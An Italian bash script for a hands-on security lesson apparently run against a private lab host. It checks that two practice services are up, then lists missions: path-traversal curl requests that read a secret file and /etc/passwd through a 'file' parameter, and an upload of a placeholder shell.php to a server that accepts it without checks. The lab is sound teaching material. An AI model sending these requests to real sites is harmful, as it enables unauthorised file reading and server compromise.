#!/usr/bin/env bash
# Lezione 17 · lato Kali · file upload, path traversal e LFI. Sola lettura.
set -uo pipefail
TARGET_IP="10.10.10.20"
echo "== Lezione 17 · File upload, path traversal e LFI =="
echo
curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8080/documenti" && echo "[OK] Banca (LFI) su :8080." || echo "[--] Banca giu': sul bersaglio  lab 12  e  lab 17 ."
curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8096/" && echo "[OK] Upload su :8096." || echo "[--] Upload giu': sul bersaglio  lab 17 ."
cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Leggere file proibiti e caricare l'infile
------------------------------------------------------------
 LFI = Local File Inclusion: far leggere al sito un file che non dovrebbe.
 Path traversal = risalire le cartelle con  ../

 [ ] 1  Leggi un file riservato con il path traversal          (+35)
        # la pagina documenti mostra solo file "pubblici":
        curl "http://10.10.10.20:8080/documenti"
        # ma con ../ esci dalla cartella e leggi altrove:
        curl "http://10.10.10.20:8080/documenti?file=../segreti/lfi.txt"
        # prova anche un file di sistema:
        curl "http://10.10.10.20:8080/documenti?file=../../../../etc/passwd"

 [ ] 2  Carica un file di tipo pericoloso (upload non validato) (+35)
        echo "codice cattivo" > shell.php
        curl --data-binary @shell.php "http://10.10.10.20:8096/upload?nome=shell.php"
        # il server accetta un .php senza controlli: ti avvisa e ti da' la flag

 Concetti:  ../  LFI  upload non validato  whitelist delle estensioni
------------------------------------------------------------
MSG
